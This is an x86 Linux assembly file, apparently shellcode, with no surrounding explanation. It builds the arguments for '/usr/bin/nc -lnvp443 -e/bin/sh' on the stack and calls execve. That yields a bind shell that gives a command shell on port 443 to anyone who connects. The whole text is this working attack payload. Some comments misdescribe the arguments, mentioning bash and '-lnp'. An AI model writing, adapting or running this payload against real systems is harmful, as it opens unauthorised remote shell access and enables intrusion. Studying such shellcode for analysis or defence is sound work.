global _start
section .text

_start:
	mov ebp,esp
	xor eax,eax
	push eax
	push 0x636e2f2f 
	push 0x6e69622f
	push 0x7273752f
	mov ebx,esp
	;; first arg done /usr/bin/nc

	push eax
	push 0x33343470
	push 0x766e6c2d
	;;;;push 0x333434 ;; 443
	;;;push 0x706e6c2d ;; -lnp arg for nc
	xor esi,esi
	mov esi,esp 	;; seconds arg done "-lnp 443"
	push eax
	
	push 0x68732f2f
	push 0x2f2f6e69
	push 0x622f652d ;; -e/bin/sh third arg
	xor edi,edi
	mov edi,esp    ;; third arg in edi

	push eax	; null
	push edi	; -e/bin/sh
	push esi	; -lvp 443
	push ebx	;; push them all in reverse order ;; -e /usr/bin/bash -lnp 443 /usr/bin/nc
	mov ecx,esp	;; move all args to ecx
	xor edx,edx	;; empty edx
	mov al,0xb
	int 0x80	
